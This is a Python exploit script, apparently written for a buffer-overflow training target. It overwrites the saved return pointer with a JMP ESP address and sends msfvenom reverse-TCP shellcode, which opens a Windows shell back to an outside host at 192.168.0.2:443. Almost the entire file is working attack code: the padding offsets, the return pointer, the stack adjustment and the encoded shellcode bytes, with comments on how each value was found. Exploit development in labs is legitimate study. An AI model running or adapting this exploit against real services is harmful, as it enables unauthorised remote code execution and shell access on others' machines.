#!/usr/bin/env python
import socket
import struct

# target --
RHOST = "192.168.0.139"
RPORT = 31337

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# total buf(len)
# offset from mona! / msf-pattern-offeset
buf_totalen = 1024
offset_srp = 146 

# prtr_jmp_esp
# from: !mona jmp -r esp -cpb "\x00\x0A"
ptr_jmp_esp = 0x080414c3

# sub esp 10 --
# metasm > sub esp,0x10                                                                                                                                    
# "\x83\xec\x10"
sub_esp_10 = "\x83\xec\x10"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.2 LPORT=443 -b "\x00\x0A" -f python -v sc 
# Payload size: 351 bytes
sc =  ""
sc += "\xba\xde\x83\xcd\x73\xd9\xce\xd9\x74\x24\xf4\x5b\x31"
sc += "\xc9\xb1\x52\x83\xc3\x04\x31\x53\x0e\x03\x8d\x8d\x2f"
sc += "\x86\xcd\x7a\x2d\x69\x2d\x7b\x52\xe3\xc8\x4a\x52\x97"
sc += "\x99\xfd\x62\xd3\xcf\xf1\x09\xb1\xfb\x82\x7c\x1e\x0c"
sc += "\x22\xca\x78\x23\xb3\x67\xb8\x22\x37\x7a\xed\x84\x06"
sc += "\xb5\xe0\xc5\x4f\xa8\x09\x97\x18\xa6\xbc\x07\x2c\xf2"
sc += "\x7c\xac\x7e\x12\x05\x51\x36\x15\x24\xc4\x4c\x4c\xe6"
sc += "\xe7\x81\xe4\xaf\xff\xc6\xc1\x66\x74\x3c\xbd\x78\x5c"
sc += "\x0c\x3e\xd6\xa1\xa0\xcd\x26\xe6\x07\x2e\x5d\x1e\x74"
sc += "\xd3\x66\xe5\x06\x0f\xe2\xfd\xa1\xc4\x54\xd9\x50\x08"
sc += "\x02\xaa\x5f\xe5\x40\xf4\x43\xf8\x85\x8f\x78\x71\x28"
sc += "\x5f\x09\xc1\x0f\x7b\x51\x91\x2e\xda\x3f\x74\x4e\x3c"
sc += "\xe0\x29\xea\x37\x0d\x3d\x87\x1a\x5a\xf2\xaa\xa4\x9a"
sc += "\x9c\xbd\xd7\xa8\x03\x16\x7f\x81\xcc\xb0\x78\xe6\xe6"
sc += "\x05\x16\x19\x09\x76\x3f\xde\x5d\x26\x57\xf7\xdd\xad"
sc += "\xa7\xf8\x0b\x61\xf7\x56\xe4\xc2\xa7\x16\x54\xab\xad"
sc += "\x98\x8b\xcb\xce\x72\xa4\x66\x35\x15\x0b\xde\x35\xe7"
sc += "\xe3\x1d\x35\xe6\x48\xa8\xd3\x82\xbe\xfd\x4c\x3b\x26"
sc += "\xa4\x06\xda\xa7\x72\x63\xdc\x2c\x71\x94\x93\xc4\xfc"
sc += "\x86\x44\x25\x4b\xf4\xc3\x3a\x61\x90\x88\xa9\xee\x60"
sc += "\xc6\xd1\xb8\x37\x8f\x24\xb1\xdd\x3d\x1e\x6b\xc3\xbf"
sc += "\xc6\x54\x47\x64\x3b\x5a\x46\xe9\x07\x78\x58\x37\x87"
sc += "\xc4\x0c\xe7\xde\x92\xfa\x41\x89\x54\x54\x18\x66\x3f"
sc += "\x30\xdd\x44\x80\x46\xe2\x80\x76\xa6\x53\x7d\xcf\xd9"
sc += "\x5c\xe9\xc7\xa2\x80\x89\x28\x79\x01\xb9\x62\x23\x20"
sc += "\x52\x2b\xb6\x70\x3f\xcc\x6d\xb6\x46\x4f\x87\x47\xbd"
sc += "\x4f\xe2\x42\xf9\xd7\x1f\x3f\x92\xbd\x1f\xec\x93\x97"

# assemble payload --
buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += sub_esp_10 # ESP points here 
buf += sc # payload
buf += "D"*(buf_totalen - len(buf))	#trailing padding
buf += "\n"

# send the buffer --
s.send(buf)